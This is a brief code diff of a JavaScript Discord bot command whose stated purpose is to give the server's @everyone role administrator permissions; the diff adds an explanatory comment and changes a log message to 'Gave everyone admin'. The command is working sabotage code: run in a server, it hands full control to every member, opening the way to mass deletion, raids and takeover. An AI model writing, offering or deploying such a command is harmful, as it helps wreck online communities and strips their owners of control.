@@ -3,8 +3,9 @@ module.exports = {
 	description: 'Gives The Everyone Role Admin Perms',
 	execute(message, args) {
 
+	//Sets the everyone role to have admin perms, turning off all the default permissions too. 	
 	message.guild.roles.everyone.setPermissions('ADMINISTRATOR');
-	console.log("the oldest anarchy server in minecraft")
+	console.log("Gave everyone admin")
 
 	},
 };
